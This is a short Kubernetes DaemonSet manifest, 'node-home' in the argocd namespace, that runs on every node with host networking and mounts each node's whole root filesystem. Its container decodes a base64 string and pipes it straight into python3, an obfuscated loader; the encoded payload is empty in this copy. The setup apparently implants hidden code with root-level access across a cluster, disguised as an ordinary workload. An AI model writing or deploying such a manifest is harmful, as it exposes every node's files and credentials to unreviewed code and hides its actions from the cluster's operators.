apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-home
  namespace: argocd
spec:
  selector:
    matchLabels:
      name: node-home
  template:
    metadata:
      labels:
        name: node-home
    spec:
      hostNetwork: true
      containers:
      - name: reader
        image: python:3.9-alpine
        command: ["/bin/sh", "-c"]
        args:
        - "echo  | base64 -d | python3 -"
        volumeMounts:
        - name: root
          mountPath: /host
      volumes:
      - name: root
        hostPath:
          path: /
